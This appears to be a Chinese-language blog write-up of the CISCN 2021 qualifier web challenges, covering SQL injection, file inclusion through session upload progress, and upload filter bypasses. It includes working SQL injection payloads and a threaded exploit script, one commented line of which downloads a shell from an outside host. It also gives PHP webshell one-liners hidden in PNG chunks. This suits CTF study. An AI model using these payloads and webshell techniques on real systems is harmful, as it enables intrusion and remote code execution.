---
title: CISCN 2021 Quals Writeup web
date: 2021-05-16
image: https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210516174112.jpg
description: CISCN 2021 线上初赛
math: true
categories: 
- ctf_writeup
tags:
- 文件包含
- 无列名注入
- ReflectionMethod
- php二次渲染
- session.upload_progress
---

就发下web的，所有wp戳这里->[第十四届全国大学生信息安全竞赛初赛 Writeup by X1cT34m](https://ctf.njupt.edu.cn/613.html)

## Web

### easy_source

原题，`ReflectionMethod` 构造 `User` 类中的函数方法，再通过 `getDocComment` 获取函数的注释

https://r0yanx.com/2020/10/28/fslh-writeup/

提交参数：

```
?rc=ReflectionMethod&ra=User&rb=a&rd=getDocComment
```

爆破rb的值a-z，在q得到flag：

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210522220457.png)

CISCN{fvsgF-5rRwf-p8KZP-vOndu-SIQoM-}

### easy_sql

fuzz：

![image-bansdasdsads](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210522220503.png)

sqlmap得到表名flag和一个列名id：报错加无列名注入

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210522220520.png)

一开始用按位比较：

```python
import requests
url = 'http://124.70.35.238:23511/'
def add(flag):
    res = ''
    res += flag
    return res
flag = ''
for i in range(1,200):
    for char in range(32, 127):
        hexchar = add(flag + chr(char))
        payload = "1') or (select 1,'NO','CISCN{JGHHS-JPD52-IJK4O-MGPDZ-DUFWI-')>=(select * from security.flag limit 1)#".format(hexchar)
        data = {"uname":"admin",'passwd':payload}
        r = requests.post(url=url, data=data)
        text = r.text
        if 'login<' in r.text:
            flag += chr(char-1)
            print(flag)
            break
```

到最后卡住了，换了无列名注入报错爆列名，然后直接报错注入：

![image-20210517175932809](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210517175941.png)

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210522220543.png)

```sql
admin')||extractvalue(1,concat(0x7e,(select * from (select * from flag as a join (select * from flag)b using(id,no))c)))#
//Duplicate column name 'e0f1d955-bbba-43c3-b078-a81b3fc4bf28'

admin')||(extractvalue(1,concat(0x7e,(select `e0f1d955-bbba-43c3-b078-a81b3fc4bf28` from security.flag),0x7e)))#
//XPATH syntax error: '~CISCN{JgHhs-jpd52-iJk4O-MGPDz-d'

admin')||(extractvalue(1,concat(0x7e,substr((select `e0f1d955-bbba-43c3-b078-a81b3fc4bf28` from security.flag),32,50),0x7e)))#
//XPATH syntax error: '~uFWI-}~'
```

CISCN{JgHhs-jpd52-iJk4O-MGPDz-duFWI-}

### middle_source

首页给了任意文件包含

扫目录得到`.listing`，得到`you_can_seeeeeeee_me.php`是phpinfo页面

有了phpinfo可以尝试直接向phpinfo页面传文件加垃圾数据，同时从phpinfo获取临时文件名进行文件包含，或者利用`session.upload_progress`进行session文件包含

前者尝试无效果

从phpinfo得到了session保存路径：`/var/lib/php/sessions/fccecfeaje/`

尝试发现可以出网，虽然ban了很多函数，但是可以直接用copy或file_get_contents下载shell

在`/etc/acfffacfch/iabhcgedde/facafcfjgf/adeejdbegg/fdceiadhce/fl444444g`发现flag

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210522220552.png)

exp：

```python
import requests
import threading

#file_content = '<?php print_r(scandir("/etc"));?>'
#file_content = '<?php copy("http://myvps/s.txt","/tmp/leon.php");echo "666666666";?>'
#s.txt是shell一句话
file_content = '<?php var_dump(file_get_contents("/etc/acfffacfch/iabhcgedde/facafcfjgf/adeejdbegg/fdceiadhce/fl444444g"));?>'

url='http://124.70.35.238:23579/'
r=requests.session()

def POST():
    while True:
        file={
            "upload":('<?php echo 999;?>', file_content, 'image/jpeg')
        }
        data={
            "PHP_SESSION_UPLOAD_PROGRESS":file_content
        }
        headers={
            "Cookie":'PHPSESSID=1234'
        }
        r.post(url,files=file,headers=headers,data=data)

def READ():
    while True:
        event.wait()
        t=r.post("http://124.70.35.238:23579/", data={"cf":'../../../../../../../../../../var/lib/php/sessions/fccecfeaje/sess_1234'})
        if len(t.text) < 2230:
            print('[+]retry')
        else:
            print(t.text)
            event.clear()
event=threading.Event()
event.set()
threading.Thread(target=POST,args=()).start()
threading.Thread(target=POST,args=()).start()
threading.Thread(target=POST,args=()).start()
threading.Thread(target=READ,args=()).start()
threading.Thread(target=READ,args=()).start()
threading.Thread(target=READ,args=()).start()
```

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210522220603.png)

CISCN{yo19m-ZqNC1-URusV-u83jg-zxqpZ-}



### upload

mb_strtolower、PHP二次渲染

这道题收卷两小时之前就看到phpinfo了，但是没做出来，有点可惜

访问题目就有源码

index.php

```php
<?php
if (!isset($_GET["ctf"])) {
    highlight_file(__FILE__);
    die();
}

if(isset($_GET["ctf"]))
    $ctf = $_GET["ctf"];

if($ctf=="upload") {
    if ($_FILES['postedFile']['size'] > 1024*512) {
        die("这么大个的东西你是想d我吗？");
    }
    $imageinfo = getimagesize($_FILES['postedFile']['tmp_name']);
    if ($imageinfo === FALSE) {
        die("如果不能好好传图片的话就还是不要来打扰我了");
    }
    if ($imageinfo[0] !== 1 && $imageinfo[1] !== 1) {
        die("东西不能方方正正的话就很讨厌");
    }
    $fileName=urldecode($_FILES['postedFile']['name']);
    if(stristr($fileName,"c") || stristr($fileName,"i") || stristr($fileName,"h") || stristr($fileName,"ph")) {
        die("有些东西让你传上去的话那可不得了");
    }
    $imagePath = "image/" . mb_strtolower($fileName);
    if(move_uploaded_file($_FILES["postedFile"]["tmp_name"], $imagePath)) {
        echo "upload success, image at $imagePath";
    } else {
        die("传都没有传上去");
    }
}
```

扫目录能扫到example.php

```php
<?php
if (!isset($_GET["ctf"])) {
    highlight_file(__FILE__);
    die();
}

if(isset($_GET["ctf"]))
    $ctf = $_GET["ctf"];

if($ctf=="poc") {
    $zip = new \ZipArchive();
    $name_for_zip = "example/" . $_POST["file"];
    if(explode(".",$name_for_zip)[count(explode(".",$name_for_zip))-1]!=="zip") {
        die("要不咱们再看看？");
    }
    if ($zip->open($name_for_zip) !== TRUE) {
        die ("都不能解压呢");
    }

    echo "可以解压，我想想存哪里";
    $pos_for_zip = "/tmp/example/" . md5($_SERVER["REMOTE_ADDR"]);
    $zip->extractTo($pos_for_zip);
    $zip->close();
    unlink($name_for_zip);
    $files = glob("$pos_for_zip/*");
    foreach($files as $file){
        if (is_dir($file)) {
            continue;
        }
        $first = imagecreatefrompng($file);
        $size = min(imagesx($first), imagesy($first));
        $second = imagecrop($first, ['x' => 0, 'y' => 0, 'width' => $size, 'height' => $size]);
        if ($second !== FALSE) {
            $final_name = pathinfo($file)["basename"];
            imagepng($second, 'example/'.$final_name);
            imagedestroy($second);
        }
        imagedestroy($first);
        unlink($file);
    }

}
```

#### bypass image size

上传处对图片的尺寸做出了要求，此时有一种方法来绕过。将下列代码拼接到POST流最后即可绕过 `getimagesize` 的检测

```
#define width 1
#define height 1
```

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210516174250.png)

经过一番调试，可以用一个txt文件和一个php文件打包一个压缩包上传，也可以直接抓包在POST数据流最后手动加上这两行

![image-20210516174519255](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210516174522.png)

#### bypass zip

mb_strtolower可以兼容unicode字符，可以使用unicode字符`İ`，经过`mb_strtolower`转换变成小写字母`i`

https://www.compart.com/en/unicode/U+1D5A8

```php
<?php
    echo mb_strtolower('İ'); //i̇
```

在example解压的时候自然是`../`目录穿越解压我们上传的压缩包

然后就是`imagecreatefrompng`，这个函数只要你确确实实是一张图片(也就是Windows下改后缀为png，能正常打开)就可以过，之后他使用`imagepng`函数把这个文件输出到web路径，不过遗憾的是，经过这个两个函数一读一输出，图片内容会变

![image-20210516175636078](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210516175639.png)

也就是说，通过Windows cmd的copy命令生成的图片马，不顶用，得换高级得马儿

这就是PHP二次渲染绕过。在此之前先插个预备知识，介绍下PNG的构造

#### PNG结构

png 支持三种图像类型

- 索引彩色图像(index-color images)
- 灰度图像(grayscale images)
- 真彩色图像(true-color images)

##### png 标识

png 标识作为 png 图片的头部，为固定的 8 字节

```
89 50 4E 47 OD 0A 1A 0A
```

##### 数据块

png 定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，标准的数据块; 另一种叫做辅助数据块(ancillary chunks)，可选的数据块。

关键数据块定义了3个标准数据块，每个 png 文件都必须包含它们。3个标准数据块为: `IHDR， IDAT， IEND`

这里介绍4个：

- 文件头数据块`IHDR`(header chunk)
- 调色板数据块`PLTE`(palette chunk)

- 图像数据块`IDAT`(image data chunk)

- 图像结束数据`IEND`(image trailer chunk)

每个数据块都由下表所示的的4个域组成。

|             名称              |  字节数  |                          说明                          |
| :---------------------------: | :------: | :----------------------------------------------------: |
|         Length(长度)          |  4字节   | 指定数据块中数据域的长度，其长度不超过$(2^{31}-1)$字节 |
| Chunk Type Code(数据块类型码) |  4字节   |         数据块类型码由ASCII字母(A-Z和a-z)组成          |
|  Chunk Data(数据块实际内容)   | 可变长度 |           存储按照Chunk Type Code指定的数据            |
|       CRC(循环冗余检测)       |  4字节   |           存储用来检测是否有错误的循环冗余码           |

其中CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的，可以看做一种校验码

---

- 文件头数据块**IHDR**(header chunk)：

  它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。

- 调色板数据块**PLTE**(palette chunk)：

  它包含有与索引彩色图像((indexed-color image))相关的彩色变换数据，它仅与索引彩色图像有关，而且要放在图像数据块(image data chunk)之前。真彩色的PNG数据流也可以有调色板数据块，目的是便于非真彩色显示程序用它来量化图像数据，从而显示该图像。结构如下：

| 颜色  |  字节  |         意义         |
| :---: | :----: | :------------------: |
|  Red  | 1 byte |  0 = 黑色, 255 = 红  |
| Green | 1 byte | 0 = 黑色, 255 = 绿色 |
| Blue  | 1 byte | 0 = 黑色, 255 = 蓝色 |

	PLTE数据块是定义图像的调色板信息，PLTE可以包含1~256个调色板信息，每一个调色板信息由3个字节组成，因此调色板数据块所包含的最大字节数为768，调色板的长度应该是3的倍数，否则，这将是一个非法的调色板。
	
	对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。

-  图像数据块**IDAT**(image data chunk)：

  它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。

  IDAT存放着图像真正的数据信息

- 图像结束数据**IEND**(image trailer chunk)：

  它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。

	```
	00 00 00 00 49 45 4E 44 AE 42 60 82
	```
	
	由于数据块结构的定义，IEND数据块的长度总是0（00 00 00 00，除非人为加入信息），数据标识总是IEND（49 45 4E 44），因此，CRC码也总是AE 42 60 82



#### 写🐎思路

了解了png结构之后，我们大概有两种思路构造webshell

1. 向**PLTE**插入php代码

   https://github.com/hxer/imagecreatefrom-/tree/master/png/analysis

   > 分析底层源码可知， png signature 是不可能插入 php 代码的； IHDR 存储的是 png 的图片信息，有固定的长度和格式，程序会提取图片信息数据进行验证，很难插入 php 代码；而 PLTE 主要进行了 CRC 校验和颜色数合法性校验等简单的校验，那么很可能在 data 域插入 php 代码。
   >
   > 从对 PLTE chunk 验证的分析可知， 当原始图片格式给索引图片时，PLTE 数据块在满足 png 格式规范的情况下，程序还会进行 CRC 校验和长度合法性验证。因此，要将 PHP 代码写入 PLTE 数据块，不仅要修改 data 域的内容为php代码，然后修改 CRC 为正确的 CRC 校验值，当要填充的代码过长时，可以改变 length 域的数值，满足 length 为3的倍数， 且颜色数不超过色深中规定的颜色数。例如: IHDR 数据块中 Bit depth 为 08, 则最大的颜色数为 2^8=256, 那么 PLTE 数据块 data 的长度不超过 3*256=0x300。 这个长度对写入 php 一句话木马或者创建后门文件足够了。

   通过文章的exp构造的webshell，能过只有`imagecreatefrompng`和`imagepng`的。

   但是经过题目`imagecrop`这种裁剪，会被有规律的吞掉

   ![image-20210522224138197](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210522224140.png)

   解决方案是可以硬调：

   ```
   */$<?=_GET/**/[fghijk;/*(/*rstuvw0])*/e$%^val/*+//
   //就问这是人能调出来的么？<?=eval($_GET[0]);
   ```

   

2. 向**IDAT**插入php代码

   原理剖析：https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

   exp：https://github.com/huntergregal/PNG-IDAT-Payload-Generator/

   当然也可以使用php版本的exp：

   ```php
   <?php
   $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
              0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
              0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
              0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
              0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
              0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
              0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
              0x66, 0x44, 0x50, 0x33);
   
   $img = imagecreatetruecolor(32, 32);
   
   for ($y = 0; $y < sizeof($p); $y += 3) {
      $r = $p[$y];
      $g = $p[$y+1];
      $b = $p[$y+2];
      $color = imagecolorallocate($img, $r, $g, $b);
      imagesetpixel($img, round($y / 3), 0, $color);
   }
   
   imagepng($img,'wh1sper.php');//要修改的图片的路径
   /* 木马内容
   <?$_GET[0]($_POST[1]);?>
    */
   ```
   
   网上的wp大多都用的第二种方法，用python的exp。然后是把`$_GET[0]`改成了`EVAL`，然后需要按照算法计算一下crc
   
   https://blog.csdn.net/miuzzx/article/details/116885083
   
   https://lemonprefect.cn/zh-cn/posts/7c083fa1#imagecreatefrompng-bypass
   
   > 使用参考的 Repo 中的代码可以生成一个长度为 25 的任意 PHP payload 的正方形图片，只需要将自带的 payload 经过 Raw Deflate 之后再 Inflate 即可

#### 题外话

这个姿势并不是新东西，在upload-labs17和DDCTF都出现过，没做出来还是说明题刷少了

另外还有其他图片的二次渲染具体可以看看：https://www.sqlsec.com/2020/10/upload.html#toc-heading-17



### 挖坑

这次国赛题目顶啊，后面的每道题都蛮不错的，可惜不知道有没有机会了，等以后有缘就冲了他

